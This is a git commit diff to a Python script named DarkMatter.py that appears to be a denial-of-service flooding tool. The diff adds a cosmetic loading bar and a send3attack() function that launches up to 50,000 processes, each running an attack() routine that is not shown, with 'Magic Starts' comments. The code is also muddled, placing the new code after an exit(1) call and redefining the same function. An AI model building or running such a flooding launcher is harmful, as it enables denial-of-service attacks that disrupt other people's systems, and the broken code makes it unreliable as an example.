56bd35c50d1f73bb985376b389fcfe08d176f0d8
CryptoXSS <91107078+CryptoXSS@users.noreply.github.com>
2022-03-20 04:25:21 +0100

    Update DarkMatter.py

--- DarkMatter.py
+++ DarkMatter.py
@@ -105,4 +105,34 @@ def send3attack():
 	
     
 send3attack()
+
 exit(1)
+
+def progressbar(it, prefix="", size=60, file=sys.stdout):
+    count = len(it)
+    def show(j):
+        x = int(size*j/count) 
+        file.write("%s[%s%s] %i/%i\r" % (prefix,  "="*x, "~"*(size-x), j, count))
+        file.flush()
+        file.write("\n")
+    show(0)
+    for i, item in enumerate(it):
+        yield item
+        show(i+1)
+        file.write("\n")
+    file.flush()
+    
+import time
+
+for i in progressbar(range(30), "Loading: ", 40):
+    time.sleep(0.5)
+
+def send3attack():
+  for i in range(50000): #Poder mágico
+    mp = multiprocessing.Process(target=attack)
+    mp.setDaemon = False
+    mp.start() #Magic Starts
+    sleep(3)
+	
+    
+send3attack()
